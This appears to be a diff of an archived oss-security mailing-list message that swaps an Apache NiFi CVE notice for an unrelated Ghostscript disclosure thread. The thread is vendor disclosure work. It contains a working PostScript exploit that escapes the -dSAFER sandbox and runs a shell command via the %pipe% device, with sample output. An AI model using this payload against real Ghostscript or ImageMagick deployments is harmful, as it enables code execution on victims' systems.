@@ -1,82 +1,283 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/05/22/1
-Message-Id: <8DD0F0D5-D38D-4EF2-8B1A-3068B9E73DC6@apache.org>
-Date: Tue, 22 May 2018 11:09:36 -0700
-From: Andy LoPresto <alopresto@...che.org>
-To: announce@...che.org, users@...i.apache.org, dev@...i.apache.org
-Cc: security <security@...che.org>, security@...i.apache.org, oss-security@...ts.openwall.com
-Subject: [ANNOUNCE] CVE Announcement for Apache NiFi 1.0.0 - 1.5.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/04/3
+Message-ID: <CAJ_zFkLOkSWe8x5N9Mf9bx1J9+oLnzNtHzTfEDXg0JGPj7N7DA@mail.gmail.com>
+Date: Tue, 4 Sep 2018 11:47:58 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
 Content-Type: text/plain; charset=utf-8
 
-The Apache NiFi PMC would like to announce the following CVE discoveries in Apache NiFi 1.0.0 - 1.5.0. These issues were resolved with the release of NiFi 1.6.0 on April 8, 2018. NiFi is an easy to use, powerful, and reliable system to process and distribute data. It supports powerful and scalable directed graphs of data routing, transformation, and system mediation logic. For more information, see https://nifi.apache.org/security.html <https://nifi.apache.org/security.html>.
+Thanks Marcus. FWIW, over the weekend upstream fixed all of the bugs I had
+opened. Just looking this morning and I can see one or two of the fixes
+were incomplete, I'll file new bugs and hopefully new fixes make it into
+9.24 release.
 
-CVE-2018-1309 <https://nifi.apache.org/security.html#CVE-2018-1309>: Apache NiFi External XML Entity issue in SplitXML processor
+(I'm only fuzzing with sort -R < postscript_commands.txt | gs -dSAFER, so
+totally possible we'll have to do this again soon)
 
-Severity: Moderate
+Tavis.
 
-Versions Affected:
+(p.s. I'm not exaggerating about the sort -R, that's literally how I'm
+fuzzing it)
 
-Apache NiFi 0.1.0 - 1.5.0
-Description: Malicious XML content could cause information disclosure or remote code execution.
+On Mon, Sep 3, 2018 at 3:59 AM Marcus Meissner <meissner@...e.de> wrote:
 
-Mitigation: The fix to disable external general entity parsing and disallow doctype declarations was applied on the Apache NiFi 1.6.0 release. Users running a prior 1.x release should upgrade to the appropriate release.
+> Hi,
+>
+> I am still holding back CVE requesting as CERT promised to do this.
+>
+> If they do not reply with a plan until tomorrow I will proceed with
+> requesting.
+>
+> Ciao, Marcus
+> On Wed, Aug 29, 2018 at 01:43:22PM -0700, Tavis Ormandy wrote:
+> > I should note, just add `userdict /setpagedevice undef` at the top if you
+> > want to test it with ImageMagick.
+> >
+> > Tavis.
+> >
+> > On Wed, Aug 29, 2018 at 1:14 PM Tavis Ormandy <taviso@...gle.com> wrote:
+> >
+> > > Thanks Marcus, here are some more necessary commits:
+> > >
+> > >
+> > >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
+> > > # 699654 D /invalidaccess checks stop working after a failed restore
+> > >
+> > >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
+> > > # 699670 gssetresolution memory corruption
+> > >
+> > >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> > > # 699671 handling /undefined results in SEGV
+> > >
+> > >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> > > # 699676 PDF interpreter can leave dangerous operators available
+> > >
+> > > Please note that not all issues are resolved, and I have exploits that
+> > > still work against HEAD.
+> > >
+> > > For example, this will still work if you pull master as of this
+> writing:
+> > >
+> > > $ cat testcase.pdf
+> > > %!PS
+> > > % This is ghostscript bug #699687 (split out from bug #699654)
+> > >
+> > > a0 % just select a papersize to initialize page device
+> > >
+> > > % You can't def HWResolution (for example), because currentpagedevice
+> is
+> > > readonly:
+> > > %
+> > > % GS>currentpagedevice wcheck ==
+> > > % false
+> > > %
+> > > % But you can just put or astore into it, because the array itself is
+> > > writable:
+> > > % GS>currentpagedevice /HWResolution get wcheck ==
+> > > % true
+> > > %
+> > > % If you put some junk in there, then grestore stops working.
+> > > currentpagedevice /HWResolution get 0 (foobar) put
+> > >
+> > > % this grestore will fail, `stopped` just handles the error instead of
+> > > aborting.
+> > > { grestore } stopped {} if
+> > >
+> > > % now LockSafetyParams will be incorrectly unset, you can check like
+> this:
+> > > % GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams
+> get
+> > > == pop
+> > > % false
+> > >
+> > > % we can change and configure devices now, so make sure we're using one
+> > > with
+> > > % a OutputFile property.
+> > > (ppmraw) selectdevice
+> > >
+> > > % run a shell command
+> > > mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+> > > showpage
+> > > $ evince testcase.pdf
+> > > uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+> > > context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+> > > (libspectre) ghostscript reports: ioerror -12
+> > >
+> > > Tavis.
+> > >
+> > > On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@...e.de>
+> wrote:
+> > >
+> > >> Hi,
+> > >>
+> > >> I had 4 CVEs assigned yesterday afternoon already working from CERTs
+> list,
+> > >> see inline comments below. Please adjust if something is incorrect in
+> > >> them.
+> > >>
+> > >> CERT has mailed overnight that they will take care of the CVE
+> assignment,
+> > >> so
+> > >> I am defering the rest to them.
+> > >>
+> > >> Ciao, Marcus
+> > >>
+> > >> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
+> > >> > Here is an update, Artifex made a press release
+> > >> > <
+> > >>
+> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
+> > >> >
+> > >> > listing
+> > >> > some necessary commits, but the list was incomplete.
+> > >> >
+> > >> > Here is a list of relevant commits I'm aware of so far, some issues
+> are
+> > >> > still open with working exploits available. It's my understanding
+> that
+> > >> no
+> > >> > new release is planned until late September, and vendors need to
+> either
+> > >> > ship a git snapshot when all issues are resolved, or apply patches.
+> I
+> > >> have
+> > >> > testcases for each problem, but I think the bugs will be visible
+> > >> eventually
+> > >> > so I'm not posting them here.
+> > >> >
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> > >> > # 699671
+> > >> > handling /undefined results in SEGV
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
+> > >> > # 699659 missing type check in ztype
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
+> > >> > 699654 A /invalidaccess checks stop working after a failed restore
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33
+> > >> #
+> > >> > 699654 B /invalidaccess checks stop working after a failed restore
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486
+> > >> #
+> > >> > 699654 C /invalidaccess checks stop working after a failed restore
+> > >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716
+> #
+> > >> 699655
+> > >> > - missing type checking in setcolor
+> > >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde
+> #
+> > >> 699656
+> > >>
+> > >>
+> > >> > - LockDistillerParams boolean missing type checks
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
+> > >>         CVE-2018-15910
+> > >>
+> > >>
+> > >> > # 699658 - Bypassing PermitFileReading by handling undefinedfilename
+> > >> errors
+> > >>
+> > >>
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
+> > >> > # 699660 - shading_param incomplete type checking
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
+> > >> > # 699660 - shading_param incomplete type checking
+> > >>         CVE-2018-15909
+> > >>
+> > >>
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
+> > >> > # 699661 - pdf14 garbage collection memory corruption
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
+> > >> > # 699663 - .setdistillerkeys memory corruption
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
+> > >> > # 699664 - corrupt device object after error in job
+> > >>
+> > >>
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
+> > >> > # 699657 - .tempfile SAFER restrictions seem to be broken
+> > >>         CVE-2018-15908
+> > >>
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
+> > >>
+> > >>
+> > >> > # 699665 - memory corruption in aesdecode
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
+> > >>
+> > >>         CVE-2018-15911
+> > >>
+> > >> > # 699668 - .definemodifiedfont memory corruption if /typecheck is
+> > >> handled
+> > >> >
+> > >> > Tavis
+> > >> >
+> > >> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
+> > >> > bfriesen@...ple.dallas.tx.us> wrote:
+> > >> >
+> > >> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
+> > >> > > >
+> > >> > > > (Regarding the `file.ps2' and `file.ps3' examples without
+> `PS2:' or
+> > >> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it
+> seems
+> > >> > > > that they ends up as:
+> > >> > > >
+> > >> > > > Domain: Coder; rights=Read; pattern="PS" ...
+> > >> > > >
+> > >> > > > ...so should be blocked by the workaround described in
+> > >> > > > VU#332928. But please correct me if I'm wrong.)
+> > >> > >
+> > >> > > This is likely due to header magic detection (e.g.
+> "%!PS-Adobe").  It
+> > >> > > is possible that a different path will be taken if the common
+> > >> > > Postscript header is not detected.  The file extension may then be
+> > >> > > used as a hint.  Also, there are a wide varieties of ImageMagick
+> > >> > > versions in use, with a wide variety of behaviors.
+> > >> > >
+> > >> > > The version of ImageMagick provided by the Ubuntu Linux I am
+> using at
+> > >> > > this moment dates from 2012!
+> > >> > >
+> > >> > > Bob
+> > >> > > --
+> > >> > > Bob Friesenhahn
+> > >> > > bfriesen@...ple.dallas.tx.us,
+> > >> http://www.simplesystems.org/users/bfriesen/
+> > >> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+> > >> > >
+> > >>
+> > >> --
+> > >> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg;
+> Zi.
+> > >> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
+> > >> meissner@...e.de>
+> > >>
+> > >
+>
+> --
+> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
+> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
+> meissner@...e.de>
+>
 
-Credit: This issue was discovered by 圆珠笔.
-
-CVE Link: Mitre Database: CVE-2018-1309 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1309>
-
-CVE-2018-1310 <https://nifi.apache.org/security.html#CVE-2018-1310>: Apache NiFi JMS Deserialization issue because of ActiveMQ client vulnerability
-
-Severity: Moderate
-
-Versions Affected:
-
-Apache NiFi 0.1.0 - 1.5.0
-Description: Malicious JMS content could cause denial of service. See ActiveMQ CVE-2015-5254 announcement <http://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt> for more information.
-
-Mitigation: The fix to upgrade the activemq-client library to 5.15.3 was applied on the Apache NiFi 1.6.0 release. Users running a prior 1.x release should upgrade to the appropriate release.
-
-Credit: This issue was discovered by 圆珠笔.
-
-CVE Link: Mitre Database: CVE-2018-1310 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1310>
-
-CVE-2017-8028 <https://nifi.apache.org/security.html#CVE-2017-8028>: Apache NiFi LDAP TLS issue because of Spring Security LDAP vulnerability
-
-Severity: Severe
-
-Versions Affected:
-
-Apache NiFi 0.1.0 - 1.5.0
-Description: Spring Security LDAP library was not enforcing credential authentication after TLS handshake negotiation. See NVD CVE-2017-8028 disclosure <https://nvd.nist.gov/vuln/detail/CVE-2017-8028> for more information.
-
-Mitigation: The fix to upgrade the spring-ldap library to 2.3.2.RELEASE+ was applied on the Apache NiFi 1.6.0 release. Users running a prior 1.x release should upgrade to the appropriate release.
-
-Credit: This issue was discovered by Matthew Elder.
-
-CVE Link: Mitre Database: CVE-2017-8028 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8028>
-
-CVE-2018-1324 <https://nifi.apache.org/security.html#CVE-2018-1324>: Apache NiFi Denial of service issue because of commons-compress vulnerability
-
-Severity: Low
-
-Versions Affected:
-
-Apache NiFi 0.1.0 - 1.5.0
-Description: A vulnerability in the commons-compress library could cause denial of service. See commons-compress CVE-2018-1324 announcement <https://commons.apache.org/proper/commons-compress/security-reports.html> for more information.
-
-Mitigation: The fix to upgrade the commons-compress library to 1.16.1 was applied on the Apache NiFi 1.6.0 release. Users running a prior 1.x release should upgrade to the appropriate release.
-
-Credit: This issue was discovered by Joe Witt.
-
-CVE Link: Mitre Database: CVE-2018-1324 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1324>
-
-
-Andy LoPresto
-alopresto@...che.org
-alopresto.apache@...il.com
-PGP Fingerprint: 70EC B3E5 98A6 5A3F D3C4  BACE 3C6E F65B 2F7D EF69
-
-
-Content of type "text/html" skipped
-
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
